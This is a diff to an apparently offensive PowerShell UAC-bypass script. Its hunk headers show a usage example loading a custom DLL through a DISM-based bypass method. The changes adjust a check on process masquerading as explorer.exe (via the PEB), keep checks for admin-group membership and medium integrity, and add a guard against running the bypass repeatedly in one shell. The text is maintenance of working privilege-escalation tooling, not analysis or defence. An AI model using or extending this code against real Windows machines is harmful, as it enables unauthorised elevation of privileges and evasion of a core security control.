@@ -1073,7 +1073,7 @@ C:\PS> Bypass-UAC -Method ucmDismMethod -CustomDll C:\Users\b33f\Desktop\cmd.dll
     
         # Sanity check just in case!
         $ProcStatus = Get-WmiObject Win32_Process -Filter "ProcessId = '$PID'"
-        if ($ProcStatus.ExecutablePath -ne "C:\Windows\explorer.exe") {
+        if ($ProcStatus.CommandLine -ne "C:\Windows\explorer.exe") {
             Masquerade-PEB -BinPath C:\Windows\explorer.exe |Out-Null
         }
     }
@@ -1253,7 +1253,7 @@ C:\PS> Bypass-UAC -Method ucmDismMethod -CustomDll C:\Users\b33f\Desktop\cmd.dll
     #---------------
     # Main() function logic, finally!
     #---------------
-    
+
     # Perform some checks on the user account
     $IsAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]'Administrator')
     $HasAdminGroup = $(($(whoami /groups) -like "*S-1-5-32-544*").length -ne 0)
@@ -1267,6 +1267,13 @@ C:\PS> Bypass-UAC -Method ucmDismMethod -CustomDll C:\Users\b33f\Desktop\cmd.dll
         Return
     } if (!$IsMediumIntegrity) {
         echo "`n[!] The current process is not medium integrity!`n"
+        Return
+    }
+
+    # Unexpected behaviour on Win7 32-bit when run multiple times..
+    $ProcStatus = Get-WmiObject Win32_Process -Filter "ProcessId = '$PID'"
+    if ($ProcStatus.CommandLine -eq "C:\Windows\explorer.exe") {
+        echo "`n[!] To prevent unexpected behaviour running Bypass-UAC multiple times in the same shell is not advised!`n"
         Return
     }
 
